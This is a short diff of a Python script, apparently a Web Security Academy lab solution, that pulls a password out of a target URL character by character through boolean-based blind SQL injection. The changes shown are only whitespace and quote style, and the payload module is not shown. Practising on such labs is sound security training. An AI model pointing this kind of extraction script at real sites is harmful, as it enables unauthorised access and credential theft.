@@ -2,7 +2,7 @@ import sys
 
 from colorama import Fore, Style
 
-from src.binary_search import  * 
+from src.binary_search import * 
 from src.info_message import welcome_message
 from src.sql_function import sending_payload_for_boolean_based_SQLi
 from src.info_message import output_message, warning_message, successful_message
@@ -17,7 +17,7 @@ def get_password_with_boolean_based_SQLi():
     indice = 1 #use to change the indice of the password 
     result = [] #list all the found character 
     success = True 
-    url = 'https://0a950065035822a080f5490b008500f1.web-security-academy.net/'
+    url = "https://0a950065035822a080f5490b008500f1.web-security-academy.net/"
 
     while indice <= 20: #we assume that the password have 20 character
         if success: #initialisation of all variable used during the process
